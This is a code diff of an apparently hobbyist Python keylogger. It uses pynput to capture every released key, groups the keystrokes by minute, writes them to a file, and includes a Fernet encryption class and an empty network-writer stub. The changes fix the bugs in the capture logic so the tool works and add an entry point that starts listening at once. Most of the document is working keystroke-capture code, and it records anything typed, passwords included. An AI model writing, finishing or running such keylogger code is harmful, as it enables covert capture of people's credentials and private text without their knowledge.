@@ -1,9 +1,8 @@
 import time, os
 from pynput import keyboard
 from cryptography.fernet import Fernet
-from requests import request
-import json
-from PythonProject import requests
+# from requests import request
+# import json
 
 class KeyLoggerService:
     def __init__(self):
@@ -11,67 +10,64 @@ class KeyLoggerService:
         self.log_l = {}
         self.long_str = ""
 
-    def get_time(self):
+    @staticmethod
+    def get_time():
         """Get The time by Minutes"""
         formatted_time = time.strftime("%Y-%m-%d %H:%M", time.localtime())
         return formatted_time
 
-    def make_long_str(self,key):
+    def make_long_str(self, key):
         """Makes a long str to chek the last characters"""
-        if hasattr(self, 'char') and key:
-            self.long_str += key
+        if hasattr(key, 'char') and key.char:
+            self.long_str += key.char
 
-    def make_dict(self,key):
+    def make_dict(self, key):
         """Making The directory of the log"""
         now = self.get_time()
-        if f"{now}" in self.log_l:
-            self.log_l[f"{now}"].append(key)
+        token = key.char if hasattr(key, 'char') and key.char else str(key)
+        if now in self.log_l:
+            self.log_l[now].append(token)
         else:
-            self.log_l[f"{now}"] = [key]
+            self.log_l[now] = [token]
 
 class KeyLoggerManager:
     def __init__(self, service, writer):
         self.log_l = None
         self.Key = None
         self.global_log = None
-        self.str_l = None
+        self.long_str = None
         self.service = service
         self.writer = writer
 
-    def key_for_log(self,key):
+    def key_for_log(self, key):
         """Loging Every key to all the function needed"""
-        self.make_long_str(self)
-        self.make_dict(self)
-        if self.str_l[-4:] == "exit":
-            print("Detected 'exit' key:", list(self.str_l))
-            self.str_l = ""
-        elif self == self.Key.space:
-            self.global_log.append(self.log_l)
-            self.log_l = {}
-        elif self == self.Key.esc:
-            self.global_log.append(self.log_l)
-            for i in self.global_log:
-                for j in i:
-                    print(f"{j}\n{i[j]} ")
-            self.outing_to_file(self.global_log)
+        self.service.make_long_str(key)
+        self.service.make_dict(key)
+
+        if self.service.long_str[-4:] == "exit":
+            print("Detected 'exit' key:", list(self.service.long_str))
+            self.service.long_str = ""
+
+        elif key == keyboard.Key.space:
+            self.service.global_log.append(self.service.log_l)
+            self.service.log_l = {}
+
+        elif key == keyboard.Key.esc:
+            self.service.global_log.append(self.service.log_l)
+            for d in self.service.global_log:
+                for minute in d:
+                    print(f"{minute}\n{d[minute]} ")
+            self.writer.outing_to_file(self.service.log_l)
             return False
+
         return None
 
     def starting_listening(self):
         """Start listening"""
-        self.log_l = {}
-        self.str_l = ""
+        self.service.log_l = {}
+        self.service.long_str = ""
         with keyboard.Listener(on_release=self.key_for_log) as listener:
             listener.join()
-
-    def make_long_str(self, self1):
-        pass
-
-    def make_dict(self, self1):
-        pass
-
-    def outing_to_file(self, global_log):
-        pass
 
 class FileWriter:
     def outing_to_file(self, grouped):
@@ -112,8 +108,14 @@ class Encryptor:
                 f.write(key)
         else:
             with open("key.key", "rb") as f:
-                key = f.read()
+                self.key = f.read()
         print("Key:", self.key.decode())
 
 class NetworkWriter:
     pass
+
+if __name__ == "__main__":
+    service = KeyLoggerService()
+    writer = FileWriter()
+    manager = KeyLoggerManager(service, writer)
+    manager.starting_listening()
